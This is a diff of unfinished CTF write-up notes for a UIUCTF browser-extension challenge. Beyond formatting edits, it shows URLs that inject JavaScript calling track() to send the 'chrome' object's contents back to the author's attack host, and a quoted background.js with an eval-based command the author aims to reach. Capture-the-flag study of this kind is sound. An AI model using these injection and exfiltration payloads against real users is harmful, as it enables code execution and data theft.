@@ -1,8 +1,7 @@
 ---
 created: 2024-06-29T18:39
-updated: 2024-06-30T20:50
+updated: 2024-07-07T23:06
 ---
-# Handout
 
 **FAILED TO SOLVE**
 
@@ -27,6 +26,7 @@ Sending it to `https://attack.octo-kumo.me/attack/uiuctf?extra=track({chrome:chr
 Turns out chrome is accessible.
 
 Sending it to `https://attack.octo-kumo.me/attack/uiuctf?extra=track({a:analyze(chrome)})&no`
+
 ```json
 {
     "loadTimes:function": {
@@ -84,6 +84,7 @@ Send `https://attack.octo-kumo.me/attack/uiuctf?extra=setTimeout(()=>{track({a:d
 hrmm...
 
 ### Background.js
+
 ```js
 async function evaluate(_origin, data) {
     return eval(data);
@@ -96,6 +97,7 @@ const commands = {
     evaluate // DEPRECATED! Will be removed in next release.
 }
 ```
+
 Then I realized this.
 
 So what's between me and that sweat `eval`? A custom token.
